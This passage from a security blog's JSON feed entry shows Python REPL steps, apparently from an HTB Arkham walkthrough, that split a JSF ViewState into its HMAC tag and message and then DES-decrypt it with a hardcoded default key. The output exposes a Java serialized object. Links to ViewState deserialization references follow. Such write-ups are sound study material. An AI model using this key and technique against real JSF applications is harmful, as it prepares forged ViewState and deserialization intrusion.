class=\"s\">#</span><span class=\"se\">\\xb5\\xe4\\x12</span><span class=\"s\">-F</span><span class=\"se\">\\x01\\xbe</span><span class=\"s\">!</span><span class=\"se\">\\xd7</span><span class=\"s\">e</span><span class=\"se\">\\x99\\xf3\\xde</span><span class=\"s\">)</span><span class=\"se\">\\x03\\xe6</span><span class=\"s\">x8~</span><span class=\"se\">\\xdb</span><span class=\"s\">r</span><span class=\"se\">\\x8d\\xa3\\\\</span><span class=\"s\">L</span><span class=\"se\">\\xb5</span><span class=\"s\">E</span><span class=\"se\">\\x0c</span><span class=\"s\">S</span><span class=\"se\">\\xa8\\xb6</span><span class=\"s\">.</span><span class=\"se\">\\xa2</span><span class=\"s\">I</span><span class=\"se\">\\x8e\\xef</span><span class=\"s\">B</span><span class=\"se\">\\xad\\x0e\\xd9\\xe0\\x8c</span><span class=\"s\">9</span><span class=\"se\">\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3</span><span class=\"s\">a</span><span class=\"se\">\\xea\\xf1\\xa3</span><span class=\"s\">H</span><span class=\"se\">\\xd6\\xef</span><span class=\"s\">;</span><span class=\"se\">\\xb5\\x99\\xd2\\x81</span><span class=\"s\">^</span><span class=\"se\">\\xdc</span><span class=\"s\">gOTf</span><span class=\"se\">\\x9d</span><span class=\"s\">e</span><span class=\"se\">\\x16</span><span class=\"s\">L</span><span class=\"se\">\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># hmac_sha1_unsig - separate message and tag (mac)#  tag     = last 20 bytes#  message = whole signature - last 20 bytes</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">t_bytes</span> <span class=\"o\">=</span> <span class=\"n\">b64_decoded</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">20</span><span class=\"p\">:]</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">m_bytes</span> <span class=\"o\">=</span> <span class=\"n\">b64_decoded</span><span class=\"p\">[:</span><span class=\"o\">-</span><span class=\"mi\">20</span><span class=\"p\">]</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">t_bytes</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\x99\\xd2\\x81</span><span class=\"s\">^</span><span class=\"se\">\\xdc</span><span class=\"s\">gOTf</span><span class=\"se\">\\x9d</span><span class=\"s\">e</span><span class=\"se\">\\x16</span><span class=\"s\">L</span><span class=\"se\">\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">m_bytes</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\xc0</span><span class=\"s\">z4</span><span class=\"se\">\\xc2</span><span class=\"s\">b</span><span class=\"se\">\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe</span><span class=\"s\">#</span><span class=\"se\">\\xb5\\xe4\\x12</span><span class=\"s\">-F</span><span class=\"se\">\\x01\\xbe</span><span class=\"s\">!</span><span class=\"se\">\\xd7</span><span class=\"s\">e</span><span class=\"se\">\\x99\\xf3\\xde</span><span class=\"s\">)</span><span class=\"se\">\\x03\\xe6</span><span class=\"s\">x8~</span><span class=\"se\">\\xdb</span><span class=\"s\">r</span><span class=\"se\">\\x8d\\xa3\\\\</span><span class=\"s\">L</span><span class=\"se\">\\xb5</span><span class=\"s\">E</span><span class=\"se\">\\x0c</span><span class=\"s\">S</span><span class=\"se\">\\xa8\\xb6</span><span class=\"s\">.</span><span class=\"se\">\\xa2</span><span class=\"s\">I</span><span class=\"se\">\\x8e\\xef</span><span class=\"s\">B</span><span class=\"se\">\\xad\\x0e\\xd9\\xe0\\x8c</span><span class=\"s\">9</span><span class=\"se\">\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3</span><span class=\"s\">a</span><span class=\"se\">\\xea\\xf1\\xa3</span><span class=\"s\">H</span><span class=\"se\">\\xd6\\xef</span><span class=\"s\">;</span><span class=\"se\">\\xb5</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># des_ecb_decrypt - here you see the actual java serialized# object which starts with \"\\xac\\xed\". It also includes the# URL path associated with the object which is:#   /userSubscribe.jsp</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">from</span> <span class=\"nn\">Crypto.Cipher</span> <span class=\"kn\">import</span> <span class=\"n\">DES</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"sa\">b</span><span class=\"s\">'JsF9876-'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">crypter</span> <span class=\"o\">=</span> <span class=\"n\">DES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">k</span><span class=\"p\">,</span> <span class=\"n\">DES</span><span class=\"p\">.</span><span class=\"n\">MODE_ECB</span><span class=\"p\">)</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">crypter</span><span class=\"p\">.</span><span class=\"n\">decrypt</span><span class=\"p\">(</span><span class=\"n\">m_bytes</span><span class=\"p\">)</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\xac\\xed\\x00\\x05</span><span class=\"s\">ur</span><span class=\"se\">\\x00\\x13</span><span class=\"s\">[Ljava.lang.Object;</span><span class=\"se\">\\x90\\xce</span><span class=\"s\">X</span><span class=\"se\">\\x9f\\x10</span><span class=\"s\">s)l</span><span class=\"se\">\\x02\\x00\\x00</span><span class=\"s\">xp</span><span class=\"se\">\\x00\\x00\\x00\\x03</span><span class=\"s\">t</span><span class=\"se\">\\x00\\x01</span><span class=\"s\">1pt</span><span class=\"se\">\\x00\\x12</span><span class=\"s\">/userSubscribe.jsp</span><span class=\"se\">\\x02\\x02</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> </code></pre></div></div><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"http://viewstatedecoder.azurewebsites.net/\">Online viewstate decoder</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization\">Hacktricks - JSF Deserialization</a></li>  <li><a href=\"https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf\">JSF ViewState upside-down</a></li>  <li><a href=\"https://dhiyaneshgeek.github.io/web/security/2021/05/08/demystifying-insecure-deserialisation-on-JSF-application/\">Demystifying Insecure Deserialisation on JSF Application</a></li>  <li><a href=\"https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application\">Secure Your Application - MYFACES2 - Apache Software Foundation</a></li>  <li>HTB Arkham</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/05/java-jsf-viewstate-deserialization",
            
            
            
            "tags": ["java","deserialization","foothold"],
            
            "date_published": "2022-04-05T00:00:00+08:00",
            "date_modified": "2022-04-05T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}